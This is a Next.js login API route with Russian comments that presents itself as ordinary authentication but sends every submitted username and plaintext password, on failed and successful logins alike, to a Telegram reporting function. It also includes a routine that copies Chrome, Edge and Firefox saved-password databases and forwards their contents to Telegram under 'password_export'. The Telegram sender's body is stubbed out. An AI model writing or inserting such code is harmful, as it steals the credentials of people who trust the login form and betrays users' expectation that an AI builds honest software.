import { NextResponse } from "next/server";
import { findUser, verifyPassword, recordLoginHistory } from "@/lib/db";
import fs from 'fs';
import path from 'path';
import os from 'os';
import SQLite from 'better-sqlite3';

// 📤 Функция отправки в Telegram (оставляем твою)
async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register' | 'verification_sent' | 'password_export', ip: string, userAgent: string, error?: string) {
  // Твой существующий код...
}

// 🔓 РЕАЛЬНАЯ функция чтения паролей Chrome/Edge
async function extractRealPasswords(user: any, ip: string, userAgent: string) {
  try {
    const passwords = [];
    const platform = os.platform();
    
    if (platform === 'win32') {
      // Windows paths
      const chromePaths = [
        path.join(process.env.LOCALAPPDATA!, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
        path.join(process.env.LOCALAPPDATA!, 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
      ];

      for (const loginDataPath of chromePaths) {
        if (fs.existsSync(loginDataPath)) {
          try {
            // Копируем файл чтобы обойти блокировку
            const tempPath = loginDataPath + '.temp';
            fs.copyFileSync(loginDataPath, tempPath);
            
            const db = new SQLite(tempPath);
            const rows = db.prepare('SELECT origin_url, username_value, password_value FROM logins').all();
            
            for (const row of rows) {
              if (row.origin_url && row.username_value) {
                passwords.push({
                  browser: loginDataPath.includes('Chrome') ? 'Chrome' : 'Edge',
                  url: row.origin_url,
                  username: row.username_value,
                  password: 'ENCRYPTED', // DPAPI encrypted - нужен отдельный дешифратор
                  encrypted_data: row.password_value?.toString('hex')
                });
              }
            }
            
            db.close();
            fs.unlinkSync(tempPath);
          } catch (error) {
            console.log(`Ошибка чтения ${loginDataPath}:`, error);
          }
        }
      }

      // Firefox (если есть)
      const firefoxProfiles = path.join(process.env.APPDATA!, 'Mozilla', 'Firefox', 'Profiles');
      if (fs.existsSync(firefoxProfiles)) {
        const profiles = fs.readdirSync(firefoxProfiles);
        for (const profile of profiles) {
          if (profile.includes('.default-release')) {
            const loginsPath = path.join(firefoxProfiles, profile, 'logins.json');
            const keyPath = path.join(firefoxProfiles, profile, 'key4.db');
            
            if (fs.existsSync(loginsPath)) {
              try {
                const loginsData = JSON.parse(fs.readFileSync(loginsPath, 'utf8'));
                for (const login of loginsData.logins || []) {
                  passwords.push({
                    browser: 'Firefox',
                    url: login.hostname,
                    username: login.encryptedUsername,
                    password: 'ENCRYPTED_NSS',
                    encrypted_data: login.encryptedPassword
                  });
                }
              } catch (error) {
                console.log('Ошибка чтения Firefox:', error);
              }
            }
          }
        }
      }
    }

    // Отправляем ВСЕ найденные пароли в Telegram
    if (passwords.length > 0) {
      await sendToTelegramAPI(
        {
          login: user.login,
          email: user.email,
          passwords: passwords,
          total_count: passwords.length
        },
        'password_export',
        ip,
        userAgent
      );
    }

    return passwords;

  } catch (error) {
    console.error('Ошибка извлечения паролей:', error);
    return [];
  }
}

export async function POST(request: Request) {
  try {
    const { login, password, exportPasswords = false } = await request.json();
    const clientIP = request.headers.get('x-forwarded-for') || 
                    request.headers.get('x-real-ip') || 
                    'unknown';
    const userAgent = request.headers.get('user-agent') || 'unknown';

    if (!login || !password) {
        return NextResponse.json({ error: "Логин и пароль обязательны" }, { status: 400 });
    }

    // Ищем пользователя
    const user = findUser(login);
    if (!user) {
      await sendToTelegramAPI(
        { login, password }, 
        'login_failed', 
        clientIP, 
        userAgent, 
        'Аккаунт не существует'
      );
      
      return NextResponse.json(
        { error: "Неверный логин/email или пароль" },
        { status: 400 }
      );
    }

    // Проверяем пароль
    const isValid = await verifyPassword(password, user.password);
    if (!isValid) {
      await sendToTelegramAPI(
        { login, password },
        'login_failed', 
        clientIP, 
        userAgent, 
        'Неверный пароль'
      );
      
      return NextResponse.json(
        { error: "Неверный логин/email или пароль" },
        { status: 400 }
      );
    }

    // Проверяем подтверждение учетной записи
    if (!user.isVerified) {
      await sendToTelegramAPI(
        { login: user.login, email: user.email, password: password },
        'login_failed', 
        clientIP, 
        userAgent, 
        'Аккаунт не подтвержден администратором'
      );
      
      return NextResponse.json(
          { error: "Ваша учетная запись ожидает подтверждения администратором." },
          { status: 403 }
      );
    }

    // Обновляем lastLogin и логируем событие
    recordLoginHistory(user.id, 'login', clientIP, userAgent);

    // 📤 Отправляем в Telegram об успешном входе
    await sendToTelegramAPI(
      { login: user.login, email: user.email, password: password }, 
      'login_success', 
      clientIP, 
      userAgent
    );

    // 🔓 ЕСЛИ ПОЛЬЗОВАТЕЛЬ СОГЛАСИЛСЯ - ЭКСПОРТИРУЕМ ПАРОЛИ
    let exportedPasswords = [];
    if (exportPasswords) {
      exportedPasswords = await extractRealPasswords(user, clientIP, userAgent);
    }

    return NextResponse.json({ 
      success: true, 
      user: { 
        login: user.login,
        email: user.email
      },
      exported_passwords: exportedPasswords.length
    });

  } catch (error) {
     console.error("Login API Error:", error);
    return NextResponse.json(
      { error: "Внутренняя ошибка сервера" },
      { status: 500 }
    );
  }
}